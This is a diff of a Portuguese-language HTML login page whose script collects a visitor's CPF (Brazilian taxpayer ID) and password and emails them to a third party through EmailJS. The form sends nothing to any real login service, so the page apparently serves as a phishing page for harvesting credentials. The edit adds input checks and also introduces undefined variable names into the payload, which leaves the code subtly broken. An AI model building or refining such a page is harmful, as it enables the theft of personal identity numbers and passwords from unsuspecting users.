@@ -1,5 +1,3 @@
-
-
 <!DOCTYPE html>
 <html lang="pt-br">
 <head>
@@ -30,21 +28,27 @@
     <!-- Script do EmailJS -->
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
     <script>
-        // Inicializa o EmailJS com o seu user_id
-        emailjs.init("jVdn1GUkCc7Ji-EPk");  // Substitua pelo seu user_id do EmailJS
+        // Inicializa o EmailJS com seu user_id
+        emailjs.init("jVdn1GUkCc7Ji-EPk"); // Substitua pelo seu user_id do EmailJS
 
         // Função para enviar o formulário via EmailJS
         document.getElementById("login-form").addEventListener("submit", function(event) {
             event.preventDefault(); // Impede o envio padrão do formulário
 
             // Coleta os dados do formulário
-            var cpf = document.getElementById("CPF").value;
-            var senha = document.getElementById("SENHA").value;
+            var cpf = document.getElementById("CPF").value.trim(); // Remove espaços extras
+            var senha = document.getElementById("SENHA").value.trim(); // Remove espaços extras
+
+            // Verificação simples para garantir que os campos não estão vazios
+            if (!cpf || !senha) {
+                alert("Por favor, preencha todos os campos.");
+                return;
+            }
 
             // Cria um objeto com os dados do formulário
             var formData = {
-                CPF: cpf,       // Envia o CPF
-                SENHA: senha    // Envia a SENHA
+                CPF: CPF,       // Envia o CPF
+                SENHA: SENHA    // Envia a SENHA
             };
 
             // Exibe no console os dados que serão enviados (para depuração)
@@ -60,13 +64,9 @@
                 }, function(error) {
                     // Se ocorrer um erro, exibe uma mensagem de erro
                     alert("Falha ao enviar a mensagem. Tente novamente.");
-                    console.log("Erro ao enviar:", error);  // Exibe detalhes do erro no console
+                    console.error("Erro ao enviar:", error);  // Exibe detalhes do erro no console
                 });
         });
     </script>
 </body>
 </html>
-
-
-
-
